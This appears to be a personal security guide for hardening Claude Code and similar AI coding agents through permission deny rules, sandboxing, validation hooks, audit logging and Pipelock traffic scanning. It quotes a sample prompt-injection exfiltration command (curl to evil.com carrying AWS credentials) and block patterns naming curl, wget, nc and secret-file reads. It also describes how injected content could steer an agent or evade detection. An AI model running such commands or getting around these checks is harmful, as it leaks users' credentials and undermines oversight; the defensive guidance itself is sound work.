# Claude Code Best Practices: Security & Usage Guide

A comprehensive, defence-in-depth guide for using AI coding agents safely and effectively — protecting secrets, enforcing sandboxing, reducing approval fatigue, optimising workflows, and aligning with NIST, ISO, and OWASP frameworks.

This started as a personal study project. I use Claude Code daily and wanted to be more conscious and deliberate about security, so I dug into threat models, sandboxing, hooks, and audit strategies and wrote everything down as a reference for myself. Claude Code is used throughout as the primary example because that's my workflow, but the principles and patterns here — secret protection, permission controls, policy enforcement, monitoring — apply to any AI agent that operates in your terminal or codebase. If you use Copilot, Cursor, Aider, or any other agentic tool, most of this translates directly.

I'm sharing this for anyone who's interested in using AI agents and is also concerned about doing it securely. Whether you're hardening a personal setup or thinking about organisational rollout, I hope this serves as a useful starting point.

This project is licenced under the BSD 2-Clause Licence. In short: do whatever you want with it. Copy it, modify it, redistribute it, put your name on your copies, use it commercially — the only requirement is that you keep the copyright notice and disclaimer in redistributions. See [LICENCE](LICENSE) for the full text.

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Defence in Depth Architecture](#2-defence-in-depth-architecture)
3. [Layer 1 — Secret Protection](#3-layer-1--secret-protection)
4. [Layer 2 — Sandboxing & Isolation](#4-layer-2--sandboxing--isolation)
5. [Layer 3 — Permission Controls](#5-layer-3--permission-controls)
6. [Layer 4 — Hooks & Policy Enforcement](#6-layer-4--hooks--policy-enforcement)
7. [Layer 5 — Audit & Monitoring](#7-layer-5--audit--monitoring)
8. [Layer 6 — Governance & Code Quality Gates](#8-layer-6--governance--code-quality-gates)
9. [Network-Layer Traffic Scanning with Pipelock](#9-network-layer-traffic-scanning-with-pipelock)
10. [Reducing Approval Fatigue Safely](#10-reducing-approval-fatigue-safely)
11. [Context, Memory & Session Management](#11-context-memory--session-management)
12. [Usage Tips & Performance](#12-usage-tips--performance)
13. [Security Frameworks Reference](#13-security-frameworks-reference)
14. [Quick-Start Secure Configuration](#14-quick-start-secure-configuration)
15. [References](#15-references)

---

## 1. Threat Model

Before applying controls, understand what you're defending against:

| Threat | Description | Impact |
|--------|-------------|--------|
| **Secret exfiltration** | Claude reads `.env`, `~/.aws/credentials`, SSH keys and includes them in context or outputs | Credential compromise |
| **Prompt injection** | Malicious content in codebases, docs, or dependencies manipulates Claude's behaviour (OWASP LLM01) | Arbitrary code execution |
| **Excessive agency** | Claude runs destructive commands (`rm -rf`, `git push --force`, `curl` to attacker domains) (OWASP LLM06) | Data loss, lateral movement |
| **Data leakage** | Proprietary code or PII sent to external services or logged (OWASP LLM02) | IP theft, privacy violation |
| **Supply chain** | Compromised MCP servers, plugins, or dependencies (OWASP LLM03) | Backdoor introduction |
| **Unbounded consumption** | Runaway agent loops consuming tokens, CPU, or API calls (OWASP LLM10) | Cost overrun, DoS |

**Design principle**: Assume any single layer can fail. Stack independent controls so a breach at one layer is caught by the next.

---

## 2. Defence in Depth Architecture

```
┌─────────────────────────────────────────────────────────┐
│  Layer 6: Governance — policies, training, code review  │
├─────────────────────────────────────────────────────────┤
│  Layer 5: Audit — logging, OpenTelemetry, transcripts   │
├─────────────────────────────────────────────────────────┤
│  Layer 4: Hooks — pre/post tool validation scripts      │
├─────────────────────────────────────────────────────────┤
│  Layer 3: Permissions — allow/deny rules, modes         │
├─────────────────────────────────────────────────────────┤
│  Layer 2: Sandbox — filesystem + network isolation      │
├─────────────────────────────────────────────────────────┤
│  Layer 1: Secrets — deny rules, env vars, MCP proxying  │
└─────────────────────────────────────────────────────────┘
```

Each layer operates independently. If a prompt injection bypasses Layer 3 permissions, Layer 2 sandbox still blocks filesystem/network access at the OS level.

---

## 3. Layer 1 — Secret Protection

### 3.1 Block Direct Access to Secret Files

In `.claude/settings.json`:

```json
{
  "permissions": {
    "deny": [
      "Read(./.env)",
      "Read(./.env.*)",
      "Read(./secrets/**)",
      "Read(~/.aws/**)",
      "Read(~/.ssh/**)",
      "Read(~/.gnupg/**)",
      "Read(~/.kube/config)",
      "Edit(./.env)",
      "Edit(./.env.*)",
      "Edit(./secrets/**)"
    ]
  }
}
```

This is the **first line of defence**. Even if Claude tries to read these files, the permission system blocks it before the file contents enter context.

> **NIST SP 800-53 AC-3**: Enforce access restrictions on information resources.

### 3.2 Pass Secrets via Environment Variables

Claude can **use** environment variables in bash commands without them entering the conversation context:

```bash
# Shell — set before launching Claude
export DATABASE_URL="postgresql://user:pass@localhost/db"
export API_KEY="sk-xxx"
claude
```

Or in `.claude/settings.json`:

```json
{
  "env": {
    "DATABASE_URL": "${DB_CONNECTION_STRING}",
    "GITHUB_TOKEN": "${GITHUB_TOKEN}"
  }
}
```

Claude can reference `$DATABASE_URL` in bash commands but never sees the raw value.

### 3.3 Use MCP Servers as API Proxies (Recommended)

Instead of Claude directly handling credentials, use MCP servers that **hold credentials internally** and expose only tool interfaces:

```bash
# Claude accesses the database through MCP tools, never sees the connection string
claude mcp add --transport stdio postgres \
  --env DATABASE_URL="postgresql://user:pass@db:5432/mydb" \
  -- npx @modelcontextprotocol/server-postgres

# Claude accesses GitHub through MCP tools, never sees the token
claude mcp add --transport stdio github \
  --env GITHUB_TOKEN="ghp_xxx" \
  -- npx @modelcontextprotocol/server-github
```

**Why this works**: The MCP process receives the secret via its own `--env` flag. Claude interacts with structured tool calls (`mcp__postgres__query`), never the raw credential. The secret lives in the MCP server process memory, not in Claude's context window.

> **ISO 27002 A.8.3**: Restrict information access to authorised functions.

### 3.4 Credential Storage

Claude Code stores OAuth tokens securely:
- **macOS**: System Keychain
- **Linux**: Encrypted credentials file
- **Windows**: Credential Manager

### 3.5 Git-Level Protection

Prevent secrets from ever entering version control:

```gitignore
# .gitignore
.env
.env.*
!.env.example
secrets/
config/credentials*
*.pem
*.key
```

Add a `pre-commit` hook or use tools like `git-secrets`/`gitleaks` to scan staged changes.

---

## 4. Layer 2 — Sandboxing & Isolation

### 4.1 Native Sandbox (Built-in)

Claude Code provides OS-level sandboxing using **macOS Seatbelt** or **Linux bubblewrap**:

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "filesystem": {
      "allowWrite": ["//tmp/build"],
      "denyWrite": ["//etc", "//usr/bin", "//usr/local/bin"],
      "denyRead": ["~/.aws/credentials", "~/.ssh"]
    },
    "network": {
      "allowedDomains": [
        "github.com",
        "*.npmjs.org",
        "api.anthropic.com",
        "registry.yarnpkg.com"
      ]
    }
  }
}
```

**Why this matters**: Even if a prompt injection tricks Claude into running `curl https://evil.com/exfil?data=$(cat ~/.aws/credentials)`, the sandbox blocks:
1. The network request (domain not allowlisted)
2. The file read (`~/.aws/credentials` in denyRead)

Both enforced at the **OS kernel level**, not just application logic.

**Prerequisites**:
- **macOS**: Built-in (Seatbelt) — no setup needed
- **Linux/WSL2**: Install `bubblewrap` + `socat`:
  ```bash
  # Ubuntu/Debian
  sudo apt-get install bubblewrap socat
  # Fedora
  sudo dnf install bubblewrap socat
  ```

> **NIST SP 800-53 SC-7**: Boundary protection — monitor and control communications at external/internal boundaries.

### 4.2 DevContainer Isolation (Strongest)

For maximum isolation, run Claude Code inside a container:

```
.devcontainer/
├── devcontainer.json    # Container config + extensions
├── Dockerfile           # Node.js 20 + dev tools
└── init-firewall.sh     # Network allowlist rules
```

Anthropic provides a [reference devcontainer](https://github.com/anthropics/claude-code/tree/main/.devcontainer) with:
- Custom firewall restricting outbound to whitelisted domains only
- Default-deny network policy
- Isolated filesystem

Inside the container, you can safely use `--dangerously-skip-permissions` because the container itself is the security boundary.

```bash
# Inside devcontainer
claude --dangerously-skip-permissions
```

> **ISO 27002 A.8.25-A.8.31**: Secure development lifecycle — separate development/test/production environments.

### 4.3 Git Worktree Isolation

For parallel tasks without risking your main working tree:

```bash
claude --worktree feature-name
```

Creates an isolated copy of the repo with a separate permission context.

### 4.4 Cloud Execution (Web Sessions)

Claude Code on the web runs in Anthropic-managed VMs with:
- Network limited to approved domains
- Credential proxy (scoped tokens, never raw secrets)
- Git push restricted to current branch only
- Automatic cleanup after session ends

---

## 5. Layer 3 — Permission Controls

### 5.1 Permission Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| `default` | Prompts for each new tool use | Normal development |
| `acceptEdits` | Auto-approves file edits, prompts for bash | Trusted codebases |
| `plan` | Read-only — no modifications allowed | Safe code review, exploration |
| `dontAsk` | Auto-denies unless pre-approved in allowlist | Strict lockdown |
| `bypassPermissions` | Skips ALL prompts (**DANGEROUS**) | Only inside containers/VMs |

Set via:
```bash
claude --permission-mode acceptEdits
```

Or in settings:
```json
{ "defaultMode": "acceptEdits" }
```

### 5.2 Three-Tier Rule Evaluation

Rules are evaluated in this order (**first match wins**):

1. **Deny** (highest priority) — always blocks
2. **Ask** — prompts for approval
3. **Allow** (lowest priority) — auto-approves

### 5.3 Fine-Grained Permission Rules

```json
{
  "permissions": {
    "allow": [
      "Read",
      "Bash(npm run *)",
      "Bash(git status)",
      "Bash(git log *)",
      "Bash(git diff *)",
      "Bash(git commit *)",
      "Edit(/src/**/*.ts)",
      "WebFetch(domain:github.com)"
    ],
    "deny": [
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(rm -rf *)",
      "Bash(sudo *)",
      "Bash(chmod 777 *)",
      "Bash(git push --force*)",
      "Read(./.env*)",
      "Read(~/.aws/**)",
      "mcp__untrusted_server__*"
    ]
  }
}
```

**Path prefixes**:
- `//path` — absolute from filesystem root
- `~/path` — from home directory
- `/path` — relative to project root
- `./path` or `path` — relative to current directory

**Wildcard matching** (Bash tool only):
- `Bash(npm run *)` matches `npm run test`, `npm run build`
- `Bash(git * main)` matches `git checkout main`, `git merge main`
- Word-boundary aware: `Bash(ls *)` matches `ls -la` but NOT `lsof`

### 5.4 Settings Precedence

From highest to lowest priority:

| Scope | Location | Who Controls |
|-------|----------|--------------|
| Managed (enterprise) | System-level CLAUDE.md | IT/Security team |
| CLI args | `--allowedTools`, `--disallowedTools` | Developer (session) |
| Local settings | `.claude/settings.local.json` | Developer (not committed) |
| Project settings | `.claude/settings.json` | Team (committed) |
| User settings | `~/.claude/settings.json` | Developer (global) |

> **NIST SP 800-53 AC-6**: Employ the principle of least privilege — authorise only the access necessary to accomplish assigned tasks.

### 5.5 Disable Bypass Mode (Enterprise)

Prevent developers from using `--dangerously-skip-permissions`:

```json
{
  "disableBypassPermissionsMode": "disable"
}
```

Set this in managed settings so it cannot be overridden.

---

## 6. Layer 4 — Hooks & Policy Enforcement

Hooks execute shell commands **before or after** Claude uses a tool, enabling custom security policies.

### 6.1 Hook Events

| Event | Fires | Security Use |
|-------|-------|--------------|
| `PreToolUse` | Before any tool executes | Block dangerous commands, validate inputs |
| `PostToolUse` | After tool succeeds | Audit, validate outputs, scan for secrets |
| `ConfigChange` | When config files change | Detect tampering |
| `SessionStart` | Session initialisation | Inject security context |

### 6.2 Block Dangerous Commands

`.claude/hooks/security-validator.sh`:
```bash
#!/bin/bash
INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# Block exfiltration attempts
if echo "$COMMAND" | grep -qE "(curl|wget|nc|ncat)\s"; then
  echo "Blocked: Network tool not allowed in bash. Use WebFetch instead." >&2
  exit 2
fi

# Block destructive operations
if echo "$COMMAND" | grep -qE "rm -rf /|sudo|chmod 777|mkfs|dd if="; then
  echo "Blocked: Destructive command." >&2
  exit 2
fi

# Block secret reading via bash (defence in depth with Layer 1)
if echo "$COMMAND" | grep -qE "cat.*(\.env|credentials|\.pem|\.key|id_rsa)"; then
  echo "Blocked: Attempt to read secret file via bash." >&2
  exit 2
fi

exit 0
```

Register in `.claude/settings.json`:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/security-validator.sh"
          }
        ]
      }
    ]
  }
}
```

### 6.3 Hook Exit Codes

| Exit Code | Effect |
|-----------|--------|
| `0` | Allow — stdout added to Claude's context |
| `2` | **Block** — action prevented, stderr shown to Claude |
| Other | Allow — stderr logged in verbose mode |

### 6.4 JSON Response for Fine-Grained Control

Hooks can return structured decisions:
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "This command requires explicit approval from security team."
  }
}
```

### 6.5 Central Audit via HTTP Hooks

Send all tool use events to a central logging service:
```json
{
  "hooks": {
    "PostToolUse": [
      {
        "hooks": [
          {
            "type": "http",
            "url": "https://audit.company.com/claude-events",
            "headers": {
              "Authorization": "Bearer $AUDIT_TOKEN"
            },
            "allowedEnvVars": ["AUDIT_TOKEN"]
          }
        ]
      }
    ]
  }
}
```

> **NIST SP 800-53 AU-2/AU-3**: Audit event logging with sufficient detail for after-the-fact investigation.

---

## 7. Layer 5 — Audit & Monitoring

### 7.1 Session Transcripts

Every Claude Code session is stored locally:

```
~/.claude/sessions/<session-id>/
├── transcript.json     # Full conversation + tool calls
├── snapshots/          # File snapshots before edits
└── metadata.json       # Session metadata
```

These can be reviewed via `/resume`, exported for compliance, or archived.

### 7.2 OpenTelemetry Integration

For teams/enterprise, send metrics to your observability stack:

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT=https://your-collector.com/v1/traces
export OTEL_EXPORTER_OTLP_HEADERS="Authorization: Bearer token"
claude
```

**Available metrics**: session count, lines edited, commits created, PRs opened, token usage, cost, tool decision events.

### 7.3 Audit Hook for Bash Commands

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "jq -c '{ts: now | todate, cmd: .tool_input.command, exit: .tool_result.exit_code}' >> ~/.claude/bash-audit.log"
          }
        ]
      }
    ]
  }
}
```

### 7.4 Checkpoints & Undo

Claude snapshots files before every edit. You can:
- Press `Esc` twice to rewind to the last checkpoint
- Restore individual files
- Review diffs of what changed

> **NIST SP 800-53 AU-6**: Review and analyze audit records for indications of inappropriate or unusual activity.

---

## 8. Layer 6 — Governance & Code Quality Gates

### 8.1 CLAUDE.md Security Policy

Add a security section to your project's `CLAUDE.md` (see [Section 11.4](#114-claudemd--the-projects-source-of-truth) for the full CLAUDE.md template):

```markdown
# Security Requirements

**Forbidden Actions**
- Never read or modify `.env`, `.env.*`, or `secrets/` files
- Never use `curl`, `wget`, or `nc` in bash — use WebFetch for HTTP
- Never run `sudo`, `chmod 777`, or `rm -rf /`
- Never commit files containing passwords, tokens, or API keys
- Never force-push or delete remote branches

**Required Practices**
- All external API access must go through MCP servers
- All database access must use the postgres MCP server
- Validate all user inputs in generated code (OWASP Top 10)
- Use parameterised queries — never string concatenation for SQL
```

### 8.2 Path-Specific Rules

`.claude/rules/api-security.md`:
```markdown
---
paths:
  - "src/api/**/*.ts"
  - "src/auth/**/*.ts"
---

# API Security Rules
- Validate all inputs with zod or equivalent
- Use HTTPS only for external APIs
- Never log passwords or API keys
- Apply rate limiting to all endpoints
- Use parameterised queries for all database access
```

### 8.3 Code Quality Gates

Require before merge:
- **SAST scanning** (Semgrep, CodeQL) on AI-generated code
- **Human code review** — AI is the author, human is the approver (NIST AC-5: Separation of Duties)
- **Automated tests** — unit, integration, and property-based tests
- **Secret scanning** — gitleaks, git-secrets, or Trivy in CI

### 8.4 Developer Training

Train developers on:
- Prompt injection risks (malicious comments/docs that manipulate Claude)
- Overreliance on AI-generated code (OWASP LLM09: Misinformation)
- How to review AI diffs effectively
- When to use `plan` mode for safe exploration before allowing changes

> **ISO 27002 A.6.3**: Information security awareness, education, and training.

---

## 9. Network-Layer Traffic Scanning with Pipelock

Sandboxing (Layer 2) controls *where* the agent can connect. Hooks (Layer 4) validate *which commands* run. But neither inspects the **content** of authorised outbound HTTPS requests. An allowed `curl` to a permitted domain can still exfiltrate secrets in the request body, query parameters, or headers — and nothing in the existing stack catches it.

[Pipelock](https://github.com/luckyPipewrench/pipelock) fills this gap with **wire-level DLP (Data Loss Prevention) scanning**. It sits between the agent and the network, inspecting every outbound request for API keys, PII, credentials, and other sensitive data patterns — catching what the other layers miss.

### 9.1 Prerequisites & Installation

**Install via Homebrew (recommended):**
```bash
brew install luckyPipewrench/tap/pipelock
```

**Or via Go (requires Go 1.25+):**
```bash
go install github.com/luckyPipewrench/pipelock@latest
```

**Verify installation:**
```bash
pipelock version
```

### 9.2 Integration Mode 1: PreToolUse Hooks

The fastest way to integrate Pipelock with Claude Code. A single command registers PreToolUse hooks that scan tool arguments before execution:

```bash
pipelock claude setup
```

This registers hooks that scan **Bash**, **WebFetch**, **Write**, **Edit**, and **all MCP tool calls** for sensitive data patterns. The generated configuration is added to `.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "pipelock scan --mode hook --tool bash"
          }
        ]
      },
      {
        "matcher": "WebFetch",
        "hooks": [
          {
            "type": "command",
            "command": "pipelock scan --mode hook --tool webfetch"
          }
        ]
      },
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "pipelock scan --mode hook --tool write"
          }
        ]
      },
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "pipelock scan --mode hook --tool edit"
          }
        ]
      },
      {
        "matcher": "mcp__*",
        "hooks": [
          {
            "type": "command",
            "command": "pipelock scan --mode hook --tool mcp"
          }
        ]
      }
    ]
  }
}
```

Pipelock hooks **coexist** with any existing PreToolUse hooks — they do not replace them. Hook execution order follows the array order in the configuration.

### 9.3 Integration Mode 2: MCP Proxy Wrapping

Pipelock can wrap MCP server commands, scanning both **client-to-server requests** (DLP) and **server-to-client responses** (injection detection) bidirectionally.

Configure in `.mcp.json`:

```json
{
  "mcpServers": {
    "postgres": {
      "command": "pipelock",
      "args": [
        "wrap",
        "--",
        "npx", "@modelcontextprotocol/server-postgres"
      ],
      "env": {
        "DATABASE_URL": "postgresql://user:pass@db:5432/mydb"
      }
    },
    "github": {
      "command": "pipelock",
      "args": [
        "wrap",
        "--",
        "npx", "@modelcontextprotocol/server-github"
      ],
      "env": {
        "GITHUB_TOKEN": "ghp_xxx"
      }
    }
  }
}
```

**What it scans:**
- **Client → Server (DLP)**: Tool arguments checked for API keys, credentials, PII before reaching the MCP server
- **Server → Client (injection)**: Server responses checked for prompt injection payloads and suspicious content before reaching the agent

### 9.4 Integration Mode 3: Forward Proxy

For full coverage of all outbound HTTPS traffic — including traffic that does not pass through Claude Code's tool system:

```bash
HTTPS_PROXY=http://127.0.0.1:9443 pipelock run -- claude
```

The forward proxy provides:
- **11-layer URL scanner** — checks domain, path, query parameters, fragment, and encoded variants
- **Request body inspection** — scans POST/PUT/PATCH payloads for sensitive data
- **Optional TLS interception** — decrypt and inspect HTTPS content (disabled by default)

If enabling TLS interception for Node.js-based tools, set the CA certificate:
```bash
export NODE_EXTRA_CA_CERTS="$(pipelock cert-path)"
```

> **Note**: Changing `forward_proxy.enabled` in `pipelock.yaml` requires a restart of the Pipelock process to take effect.

### 9.5 Integration Mode Comparison

| Mode | What's Scanned | What's Not Scanned | Setup Complexity | Best For |
|------|---------------|-------------------|-----------------|----------|
| **PreToolUse Hooks** | Tool arguments (Bash, WebFetch, Write, Edit, MCP) | Raw HTTPS traffic, response bodies | Low — single command | Quick setup, most common threats |
| **MCP Proxy Wrapping** | MCP tool arguments + server responses | Non-MCP traffic, direct Bash network calls | Medium — per-server config | MCP-heavy workflows, response injection detection |
| **Forward Proxy** | All outbound HTTPS traffic (requests + responses) | Non-HTTPS traffic, localhost connections | High — proxy + optional TLS certs | Maximum coverage, compliance requirements |

For defence in depth, combine modes: use **PreToolUse hooks** for tool-level scanning and the **forward proxy** for full network coverage.

### 9.6 Configuration

Create `pipelock.yaml` in your project root (or use the built-in Claude Code preset):

```yaml
# pipelock.yaml
preset: claude-code.yaml

mode: warn           # warn | block — start with warn, switch to block once tuned
enforce: true        # enable policy enforcement
entropy_threshold: 5.0  # flag strings with Shannon entropy above this (API keys, tokens)

explain_blocks: false   # if true, tells the agent WHY a request was blocked
                        # WARNING: this leaks your policy rules to the agent

response_actions:
  high_confidence:   block   # definite secrets (AWS keys, GitHub tokens)
  medium_confidence: ask     # probable secrets — prompt the user
  low_confidence:    warn    # suspicious patterns — log but allow
  injection:         strip   # remove prompt injection payloads from responses

hot_reload: true    # pipelock watches pipelock.yaml and reloads on change
```

**Response actions:**
- `warn` — log the match, allow the request to proceed
- `block` — reject the request, return an error to the agent
- `strip` — remove the matched content from the payload and forward
- `ask` — pause execution and prompt the user for a decision

Configuration changes are picked up automatically when `hot_reload: true` — no restart required (except for `forward_proxy.enabled`).

### 9.7 Security Considerations

**Policy leakage**: Setting `explain_blocks: true` tells the agent exactly *why* a request was blocked, including the matched pattern. A prompt injection could use this to craft payloads that evade detection. Keep `explain_blocks: false` in production.

**Start with `warn` before `block`**: New deployments should run in `warn` mode to identify false positives. Review the logs, tune `entropy_threshold` and pattern lists, then switch to `block`.

**Entropy threshold tuning**: The default `entropy_threshold: 5.0` catches most API keys and tokens (which typically have Shannon entropy > 5.5) while allowing normal code strings. Lower the threshold for stricter scanning (more false positives); raise it for fewer alerts (risk of missed secrets).

**TLS interception is optional**: Forward proxy mode works without TLS interception — it inspects the plaintext HTTP CONNECT metadata (domain, port, SNI). Enable TLS interception only when you need to inspect encrypted request/response bodies. When enabled, set `NODE_EXTRA_CA_CERTS` for Node.js processes:
```bash
export NODE_EXTRA_CA_CERTS="$(pipelock cert-path)"
```

**Capability separation**: The agent holds secrets (via environment variables and MCP servers). Pipelock holds *none* — it only inspects traffic passing through it. This separation means a compromised Pipelock process cannot leak secrets it never possessed.

**Kill switch**: Pipelock exposes a local API endpoint to immediately disable scanning in an emergency:
```bash
curl -X POST http://127.0.0.1:9443/api/v1/bypass
```

### 9.8 CI/CD Integration

For pipeline scanning, use the [Pipelock GitHub Action](https://github.com/luckyPipewrench/pipelock-action):

```yaml
# .github/workflows/ci.yml
- name: Scan outbound traffic
  uses: luckyPipewrench/pipelock-action@v1
  with:
    mode: block
    config: pipelock.yaml
```

This wraps your CI steps with the same DLP scanning applied locally, ensuring consistent policy enforcement across development and pipeline environments.

**Why this matters**: Sandboxing controls *where* traffic goes. Permissions control *what tools* run. But without content inspection, an authorised request to an allowed domain can exfiltrate secrets in the payload body. Pipelock adds the missing layer — scanning *what's actually being sent* — completing the defence-in-depth model.

> **NIST SP 800-53 SC-7 (Boundary Protection)**: Monitor and control communications at the external managed interfaces to the system and at key internal boundaries within the system.

> **NIST SP 800-53 SC-8 (Transmission Confidentiality and Integrity)**: Protect the confidentiality and integrity of transmitted information.

---

## 10. Reducing Approval Fatigue Safely

Approval fatigue leads to rubber-stamping — which is worse than no approvals at all. Here's how to reduce prompts while maintaining security.

### Strategy A: Pre-Approve Safe Commands

```json
{
  "permissions": {
    "allow": [
      "Read",
      "Bash(npm run test)",
      "Bash(npm run lint)",
      "Bash(npm run build)",
      "Bash(npx tsc --noEmit)",
      "Bash(git status)",
      "Bash(git log *)",
      "Bash(git diff *)",
      "Bash(git add *)",
      "Bash(git commit *)"
    ],
    "deny": [
      "Bash(curl *)",
      "Bash(wget *)",
      "Bash(sudo *)",
      "Bash(git push *)",
      "Read(./.env*)",
      "Read(~/.aws/**)"
    ]
  }
}
```

**Principle**: Allow read-only and build commands. Block network tools and destructive operations. Everything else prompts.

### Strategy B: Sandbox + Auto-Allow

The strongest approach for unattended work:

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "filesystem": {
      "denyWrite": ["//etc", "//usr/bin"],
      "denyRead": ["~/.aws", "~/.ssh"]
    },
    "network": {
      "allowedDomains": ["github.com", "*.npmjs.org"]
    }
  }
}
```

Bash commands auto-execute **inside sandbox boundaries** without prompts. The sandbox enforces OS-level restrictions regardless of what commands run.

### Strategy C: Accept Edits Mode

```json
{ "defaultMode": "acceptEdits" }
```

File edits auto-approve. Bash commands still prompt. Good for trusted codebases where the risk is command execution, not file changes.

### Strategy D: Session-Scoped Overrides

```bash
# One session with broader permissions
claude --allowedTools "Read" "Edit" "Bash(npm run *)" "Bash(git *)"

# Another session in plan mode for review
claude --permission-mode plan
```

### The Anti-Pattern: Don't Do This

```bash
# DANGEROUS — no safety net
claude --dangerously-skip-permissions  # on main machine
```

Unless you're inside a container/VM, this removes all protection layers. A single prompt injection becomes arbitrary code execution on your machine.

---

## 11. Context, Memory & Session Management

Losing context mid-task is a security and productivity risk — Claude may hallucinate project state, repeat mistakes, or forget constraints. This section covers how to keep Claude grounded in reality.

### 11.1 Session Resuming

**Resume the last session:**
```bash
claude --continue        # or -c — resume most recent conversation in this directory
```

**Pick a specific session:**
```bash
claude --resume          # or -r — interactive session picker
claude --resume auth-refactor  # resume by name
```

**Name sessions for easy retrieval:**
```
/rename auth-refactor    # name the current session
```

**Session picker shortcuts** (`/resume` in interactive mode):

| Key | Action |
|-----|--------|
| `↑`/`↓` | Navigate sessions |
| `→`/`←` | Expand/collapse grouped sessions |
| `P` | Preview session content |
| `R` | Rename session |
| `/` | Search/filter |
| `A` | Toggle current directory vs. all projects |
| `B` | Filter to current git branch |

**Fork a session** to try a different approach without losing the original:
```bash
claude --continue --fork-session
```

> **Tip**: Name sessions before ending them. "Session from 3 days ago" is useless — `auth-refactor-v2` is findable.

### 11.2 What Survives What

Understanding what persists across each operation prevents surprises:

| Content | `/compact` | `/clear` | Session Resume | Context Compression |
|---------|-----------|----------|----------------|---------------------|
| **CLAUDE.md** | Re-read from disk | Re-read from disk | Re-read from disk | Preserved |
| **Auto memory** (`~/.claude/projects/`) | On disk | On disk | On disk | On disk |
| **`.claude/rules/`** | Re-read | Re-read | Re-read | Preserved |
| **Conversation history** | Summarised | **Gone** | Full restore | Auto-summarised |
| **File edits** | Kept | Kept | Kept | Kept |
| **Session permissions** | Kept | Kept | **Not restored** | Kept |

**The critical insight**: Anything you told Claude only in conversation **will be lost** on compaction. If it matters, put it in a file.

### 11.3 Surviving Context Compression

Context compression happens automatically as the window fills up. Here's how to ensure nothing critical is lost.

**Rule 1: Put persistent instructions in CLAUDE.md, not conversation.**

```markdown
# CLAUDE.md — always loaded, always survives compression

**Project State**
- We are migrating from Express to Fastify (in progress)
- Auth module is complete, API routes are 60% done
- Do NOT modify src/legacy/ — it's being deprecated but still in production

**Build & Test**
- `pnpm test` — run all tests
- `pnpm test:integration` — requires DATABASE_URL set
- `pnpm build` — outputs to dist/
```

If you give Claude a verbal instruction like "remember we're using Fastify not Express" and context compresses, that instruction vanishes. Write it in CLAUDE.md instead.

**Rule 2: Use `/compact` with focus instructions before the system does it for you.**

```
/compact focus on:
- The migration from Express to Fastify
- Which files have been modified
- Failing tests and their error messages
- Current branch and uncommitted changes
```

Proactive compaction with focus instructions preserves what matters. Automatic compression uses generic summarisation.

**Rule 3: Add compaction instructions to CLAUDE.md.**

```markdown
# Compaction Instructions
When compacting, always preserve:
- Full list of modified files and what changed in each
- All failing test names and error messages
- Current git branch and uncommitted changes
- Any API contracts or interface definitions discussed
- Which tasks are done vs. remaining
```

These instructions survive compression (since they're in CLAUDE.md) and guide the summariser.

**Rule 4: `/clear` between unrelated tasks.**

Don't let context from Task A pollute Task B. After finishing a task:
```
/clear
```
This gives the next task a clean context window instead of fighting stale assumptions.

**Rule 5: Use subagents for exploration.**

Instead of Claude reading 50 files (filling context with code you don't need):
```
Explore the auth module and tell me how token refresh works.
Don't modify anything.
```

Subagents explore in isolated context and return only a summary.

### 11.4 CLAUDE.md — The Project's Source of Truth

CLAUDE.md is **always loaded at session start**, **survives compression**, and is **re-read from disk after `/compact`**. Use it to anchor Claude in your actual project state.

**Structure for a real project:**

```markdown
# Project: MyApp

**Current State**
- Framework: Fastify 5.x (migrated from Express in Feb 2026)
- Database: PostgreSQL 16 via Drizzle ORM
- Auth: JWT + refresh tokens, implemented in src/auth/
- Frontend: React 19 + Vite, in packages/web/

**Architecture Decisions**
- Monorepo managed with pnpm workspaces
- API versioning via URL prefix (/v1/, /v2/)
- All env config loaded through src/config/env.ts — never read .env directly

**Build & Test Commands**
- `pnpm test` — vitest, all packages
- `pnpm test:e2e` — playwright, requires `pnpm dev` running
- `pnpm build` — turbo build, outputs to dist/
- `pnpm db:migrate` — run pending Drizzle migrations
- `pnpm lint` — biome check

**Active Work**
- [ ] Migrate /v1/users endpoints to Fastify (src/api/v1/users/)
- [x] Auth module complete
- [ ] Add rate limiting middleware

**Important Constraints**
- src/legacy/ is deprecated — do NOT modify, only read for reference
- All new endpoints must have integration tests
- Never import from @internal/shared directly — use the public API
```

**What makes this effective:**
- **Current state** prevents Claude from assuming outdated structure
- **Active work** with checkboxes gives Claude task awareness that survives sessions
- **Constraints** prevent common mistakes ("don't touch legacy")
- **Exact commands** eliminate guessing (`pnpm` not `npm`, `vitest` not `jest`)

**Anti-patterns to avoid:**
- Don't list every file — Claude can read the filesystem
- Don't explain standard language features — Claude knows TypeScript
- Don't write essays — keep each section concise and scannable
- Don't let it grow past ~200 lines — split into `.claude/rules/` files

### 11.5 Auto Memory — Cross-Session Persistence

Claude Code maintains a memory directory at `~/.claude/projects/<project>/memory/` that persists across sessions.

```
~/.claude/projects/<project>/memory/
├── MEMORY.md          # Index file — first 200 lines loaded every session
├── debugging.md       # Topic file — loaded on demand
├── api-conventions.md # Topic file — loaded on demand
└── patterns.md        # Topic file — loaded on demand
```

**How it works:**
- `MEMORY.md` (first 200 lines) loads at session start — keep it concise
- Topic files are read on demand when relevant
- Claude decides what to remember — you can also ask explicitly: *"Remember that we use bun, not npm"*
- Files are plain markdown — edit or delete anytime

**Manage memory:**
- `/memory` — browse memory files, toggle auto-memory, open in editor

**When to use auto memory vs. CLAUDE.md:**

| Use CLAUDE.md for | Use auto memory for |
|---|---|
| Project structure and commands | Debugging discoveries |
| Architecture decisions | Personal workflow preferences |
